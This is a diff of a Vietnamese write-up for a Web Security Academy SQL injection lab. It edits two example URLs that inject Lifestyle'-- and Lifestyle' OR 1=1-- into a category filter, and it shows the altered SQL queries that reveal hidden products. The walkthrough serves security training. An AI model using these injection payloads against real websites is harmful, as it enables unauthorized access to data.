@@ -18,7 +18,7 @@ Nghĩa là ta sẽ lấy hết những sản phẩm thuộc danh mục là Lifes
 ![Product of Lifeslyte](/Images/productOfLifestyle.png)
 
 Ta có thể chỉnh sửa URL thành như sau:
-> https://acba1f291e3a4993c0bd46c60095006e.web-security-academy.net/filter?category=Lifestyle%27—  
+> https://acba1f291e3a4993c0bd46c60095006e.web-security-academy.net/filter?category=Lifestyle'—  
 
 Đổi thành câu truy vấn như sau: 
 > SELECT * FROM category WHERE category = 'Lifestyle'--' AND released = 1
@@ -34,7 +34,7 @@ Và kiểm tra kết quả hiển thị
 
 Ta có thể thấy, phần sản phẩm đã xuất hiện thêm 1 sản phẩm mới là 'Balance Beams'
 Tiếp theo, để hiển thị tất cả sản phẩm của bất kỳ danh mục có trong website ta thay đổi URL như sau:
-> https://acbd1f821e134f99c0144063006500b4.web-security-academy.net/filter?category=Lifestyle%27+OR+1=1--
+> https://acbd1f821e134f99c0144063006500b4.web-security-academy.net/filter?category=Lifestyle'+OR+1=1--
 
 Đổi thành câu truy vấn như sau:
 > SELECT * FROM category WHERE category = 'Lifestyle' OR 1=1--' AND released = 1
